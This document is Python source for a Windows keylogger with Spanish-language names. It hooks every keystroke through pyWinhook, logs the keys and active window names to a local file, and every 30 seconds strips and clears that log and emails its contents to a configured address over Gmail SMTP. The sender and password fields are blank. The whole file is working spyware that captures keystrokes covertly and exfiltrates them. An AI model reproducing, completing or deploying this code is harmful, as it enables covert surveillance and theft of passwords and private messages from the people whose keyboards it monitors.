import pyWinhook
import pythoncom
import logging
import time 
import datetime
import os

ruta_base = os.path.dirname(__file__)
carpeta_destino = os.path.join(ruta_base, "Keylogger")
archivo = "Keylogger.txt"
ruta_destino = os.path.join(carpeta_destino, archivo)

os.makedirs(carpeta_destino, exist_ok=True)
if not os.path.exists(ruta_destino):
    with open(ruta_destino, "w") as f:
        f.write("Archivo Creado")


segundos_espera= 30
timeout= time.time()+ segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False
    
def Enviar_Email():
    with open(ruta_destino, "r+") as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = data.replace("Space", " ")
        data = data.replace("Lcontrol", "")
        data = data.replace("Rcontrol", "")
        data = data.replace("Return", "\n")
        data = data.replace("Back", "")
        data = "Mensaje enviado a las " + fecha + "\n" + data
        f.seek(0)
        f.truncate()
        Crear_Email(
            user='', #Correo
            contra='', #Contraseña
            recep='', #Correo
            subj='Nueva Captura: ',
            boddy=data
        )

       
        

def Crear_Email(user, contra, recep, subj, boddy):
    import smtplib

    From = user
    To = recep
    Txt = boddy
    mailUser = user
    mailPass = contra  # Usa el argumento recibido

    email = f"From: {From}\nTo: {To}\nSubject: {subj}\n\n{Txt}"

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print("Correo enviado")
    except Exception as e:
        print('Correo fallido:' , e) 

def  Guardar_Evento(event):
    logging.basicConfig(filename=ruta_destino, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    print('Window Name:', event.WindowName)
    print('Window:', event.Window)
    print('key:', event.Key) #Sirve para ver la tecla que se presiona
    logging.log(30, event.Key)   
    return True

hooks_mmanager = pyWinhook.HookManager() #Gestor de eventos
hooks_mmanager.KeyDown = Guardar_Evento
hooks_mmanager.HookKeyboard()


while True:
    if TimeOut():
        Enviar_Email()
        timeout=time.time()+ segundos_espera


    pythoncom.PumpWaitingMessages()  
